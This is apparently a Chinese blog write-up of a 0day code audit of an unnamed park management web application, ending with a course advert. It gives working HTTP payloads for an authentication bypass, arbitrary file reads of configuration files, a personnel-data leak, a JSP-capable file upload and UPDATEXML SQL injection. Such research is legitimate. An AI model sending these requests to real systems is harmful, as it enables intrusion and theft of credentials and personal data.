#  某园区0day代码审计   
 进击安全   2025-06-04 06:47  
  
# 1、权限绕过  
## 1.1、方法一  
  
这里看spring-mvc  
的配置，找到SpringMVC  
拦截器  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWiaNEJiaIibY3W02oDb42tTibm4c0P8Che3l0EezS9HFiaicPaDAFMlaug4pg/640?wx_fmt=jpeg&from=appmsg "")  
  
跟进拦截器，主要看看拦截规则写的什么，判断地址是否为白名单，如果部位白名单进入到  
  
if (session.getAttribute("__sessional_user__") == null) {  
循环中  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWFd7zhzKNLJY6O0fV8o4uvyBROyKvmzk6UWqLBOV5qic5XPsO9Rey0ug/640?wx_fmt=png&from=appmsg "")  
  
白名单地址为  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWycWDrLQo3B5xH6Aujf7WEcNfAJ1LHVCUXcOgIMTvrwpCaJh2hMJFpA/640?wx_fmt=png&from=appmsg "")  
  
然后跟踪isWhiteUri  
函数，这里的权限绕过是因为contains  
函数，这个函数意思是只要内容包含白名单的路径，他就会返回true  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWxGEWZZACdEC8UFCFO5vpQlIQYTq8kwUobzm2GEhQG5PRKvHYIuUBjQ/640?wx_fmt=png&from=appmsg "")  
  
这里就可以用/白名单/..;/..;/绕过鉴权，如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWOvgWwcCTI25LvFofic9FLVmuWG63CIqSetUvqchrFtDjEdu5G1OfribQ/640?wx_fmt=png&from=appmsg "")  
## 1.2、方法二  
  
如果请求的地址不是白名单，则进入到if循环和try-catch  
语句中，第一个if  
里面的不用看了，到现在还没有绕过来。主要看第二个鉴权的代码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWzzMchCp8wy8We9AxANGjJ6Wcf0qBvIq2w3Q01ibicpzQJibUiaibkmLkR8g/640?wx_fmt=png&from=appmsg "")  
  
这里的逻辑主要是判断，解密后的数组recoToken  
用,  
分割判断长度是为2，并且数组第二位是否为数字，之后才会将信息添加到session  
中。那么加密代码如下  
- [ ] 数组第二位为字母，不执行  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWVKCXuPO2zdmncBa193eewmiaylJlIpdHWp4TWU1npPnQIJzC5tlpJwQ/640?wx_fmt=png&from=appmsg "")  
- [ ] 为数字执行  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWtmLWbcXTQFwjdstrqADcKsJdziaVeP1JKlvdxByGYLxmZ3sjQUEh1hg/640?wx_fmt=png&from=appmsg "")  
  
成功绕过  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWmWeiaVibyDD2RhNmWcevWTQhA7p4Qs62lEhPXF7FQ5bJwohEHibKTzdqg/640?wx_fmt=png&from=appmsg "")  
  
‍  
# 2、文件读取1  
  
全局搜索download  
关键字，这里的函数fileDownload.do  
请求时需要带参数fileId  
，该参数没有任何的过滤，用getRootPath  
获取请求的路径，之后在用loadFile  
加载该路径。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWtBPO3iciad1Q3iaicaqBSsOAyeHwgvCIUNKhnS8gzP0AhPEOAZZu53fg7w/640?wx_fmt=jpeg&from=appmsg "")  
  
payload：  
```
GET /manage/personnel/fileDownload.do?fileId=/WEB-INF/web.xml&recoToken=ZuZBOrvLG8M HTTP/1.1Host: xUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36Accept-Encoding: gzip, deflateAccept: */*Connection: close
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWibO2ibXw3b1FuRibMOnxTG5Tiby9d862SvKlhCACAt37OLzibTt32yBrtAw/640?wx_fmt=png&from=appmsg "")  
  
‍  
# 3、文件读取2  
  
参数imgDownload.do  
，这里也是直接请求路径，之后读取该路径的数据。这里有个主意的是参数getCaptureDirectoryPhysicalPath  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWJvUI0lsoVTzj6rR2LPxeiaibng7XnxD2Qx6zhGichCK9OBq3jWyg2S4UQ/640?wx_fmt=png&from=appmsg "")  
  
跟进getCaptureDirectoryPhysicalPath  
，这里重要的是基础的路径后面加了三个../  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWMh5mAnolx5Bovgc1IMnFtHlQYicnYBcR2REy4PCppuryMX3v1rp18ibw/640?wx_fmt=jpeg&from=appmsg "")  
  
那这里的跳转的路径直接到/manage 目录下  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWTMUZ1Zn73Q5s6IVX0Al6qhpyX6p2nVUdqafVkLicuce5XIMibx6r8nrw/640?wx_fmt=png&from=appmsg "")  
  
‍  
  
那么请求的敏感文件路径payload  
为  
```
GET /manage/resourceUpload/imgDownload.do?filePath=/manage/WEB-INF/classes/app.properties&recoToken=ZuZBOrvLG8M HTTP/1.1Host: xUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36Accept-Encoding: gzip, deflateAccept: */*Connection: close
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWFEicMiaxw7ouw4YrB5ONCe1OFjicibwabaxeeYjFS6pXIxG9Ka9T7HgnpQ/640?wx_fmt=png&from=appmsg "")  
  
‍  
  
‍  
  
‍  
# 4、信息泄露(账号密码)  
  
主要观察控制层的User  
、Personnel  
等关键字  
  
比如PersonnelController  
，查询到的接口queryPersonnelInfo  
、queryPersonnel  
、getPersonnelById  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWptQfwsNa7ibLCS86Pz6V8uGricXiacboTHuIfSmM1KvvolibF33t0XxA9w/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWEuUjoiafmA9LnFeGORQs40ibMtx6TVnfAsxvna5aPWskcBeibsT3yiaXvw/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWSfO0Jmty3s7UlbYDRu4OT46L5us4b9UHTNWIdibuExichhrzBQGicWN0Q/640?wx_fmt=jpeg&from=appmsg "")  
```
GET /manage/personnel/queryPersonnel.do?page=1&pagesize=1000&recoToken=ZuZBOrvLG8M HTTP/1.1Host: xUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36Accept-Encoding: gzip, deflateAccept: */*Connection: close
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWpOj6IUqHTLic4VSQMTV61JDt1Vr7gIPMVrVc7hxI2yxvcibgsicGO07Jw/640?wx_fmt=png&from=appmsg "")  
  
‍  
  
‍  
# 5、文件上传  
  
这里上传很多，就拿一个举例全局搜索upload  
，定位到  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWP5cMpiaz3qgAm9ic1VclO0N6icAvhZvoXjStn70tZMG6zDvHiaQH6bnnDA/640?wx_fmt=jpeg&from=appmsg "")  
  
‍  
  
就检测一个地方，是不是文件上传的类型，之后用copy  
函数，复制内容和文件名。这里拿txt做样式，jsp后缀可上传。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWo594jjojQUNFRRzXHyGe4bnKQfKfib0as424Oho7CicofxBZFMkTRnBA/640?wx_fmt=jpeg&from=appmsg "")  
```
POST /manage/dgmCommand/resourceUploadFile.do?recoToken=ZuZBOrvLG8M HTTP/1.1Host: xUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELjAccept: */*Connection: close------WebKitFormBoundaryFfJZ4PlAZBixjELjContent-Disposition: form-data; name="3"; filename="1.txt"Content-Type: image/jpeg1------WebKitFormBoundaryFfJZ4PlAZBixjELj--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWJqJzKibT83XJck06MhwnkN4bWb2oRJq6qZhUzlvKiatDCH25iaQh2HyZw/640?wx_fmt=png&from=appmsg "")  
  
‍  
# 12、sql注入1（两处）  
  
SQL注入也很多，拿一个做案例。在下面的mapper  
的目录中，看到有两个可控参数order  
和columnKey  
，这里的columnKey  
注入条件必须order  
不为空才能进行诸如  
  
/manage/WEB-INF/lib/x.server-1.0.jar!/com/x/x/mapper/mysql/black_list/BlackListDsm.xml  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWBGw3CoKaFB6Ecl5zob03a2hs7po6CZScTCnVdwnlfJV1z9lQO1ice2g/640?wx_fmt=png&from=appmsg "")  
  
‍  
  
这里进行反推，找关键函数queryBlackList  
，文件从BlackListDsm  
->BlackListBsm  
->BlackListAsm  
->BlackListController  
  
BlackListDsm  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWSaHFULmAzrVFJePCKGJg61EkNvfiaqsLqOAtdtX5o2Ac42oyccmkREQ/640?wx_fmt=png&from=appmsg "")  
  
BlackListBsmImpl  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWdPQMmecL4ibcmiaSY7DNGc4wibVm13UW81rBTDcd0TDd0RPaVIOxvAUOg/640?wx_fmt=png&from=appmsg "")  
  
BlackListAsmImpl.class  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEkF6u6VKTueovIFZUAGGHGW1OjhdXoyGGWYvibiaKEvjdKg5ia7OgeN6Tyw5ncq8U61G3RpTDBKkialOQ/640?wx_fmt=png&from=appmsg "")  
  
‍  
  
BlackListController.class  
，用set  
方法设置参数，并调用函数queryBlackList  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/90EWr4bdmEkF6u6VKTueovIFZUAGGHGWOoiaoAHR7LCg5BkEdWJPgd70s8J25bnjyoH5WkaANOMbibHb6uyWicxjg/640?wx_fmt=jpeg&from=appmsg "")  
  
‍  
  
那这里的sql注入payload1  
```
GET /manage/systemBlackList/queryBlackList.do?recoToken=ZuZBOrvLG8M&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x2e,0x71716a7071,(SELECT+(ELT(2920=2920,1))),0x71706b7671),8357)) HTTP/1.1Host: xUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedAccept: */*Connection: close
```  
  
payload2  
```
GET /manage/systemBlackList/queryBlackList.do?recoToken=ZuZBOrvLG8M&page=1&pageSize=10&order=asc&columnKey=(UPDATEXML(2920,CONCAT(0x2e,0x71716a7071,(SELECT+(ELT(2920=2920,1))),0x71706b7671),8357)) HTTP/1.1Host: xUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedAccept: */*Connection: close
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEkF6u6VKTueovIFZUAGGHGW6j0sU2zFkESARJePZpD5qCe7BetvXuph1xGWZzTR2hGO9XMHRTYdgg/640?wx_fmt=png&from=appmsg "")  
## 完结  
  
  
代码审计第四期，富含PHP、JAVA、NET代码审计，顺带APP、小程序、WEB当中参数逆向以及JAVA工具二开与SRC案例讲解，其中多多0day讲解，实战案例分析，不拿着靶场去做，想学习速速报名了。  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhUicibrBmrZ2iazoDJic2RyDklw4547e6aNia1OEMntI6wGqRdvr87XVgUdiaiczwW67bRO3iayvd7H7bZoeQ/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&tp=wxpic "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ZRKuxIKRyhXhuxbCGecu4ibia3kSXD8ePQHrSvPSNtC7PmjzQwR88Hu0LpuXdQzamKBCPAXX82anLS8f0FF3LzzQ/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&tp=wxpic "")  
  
  
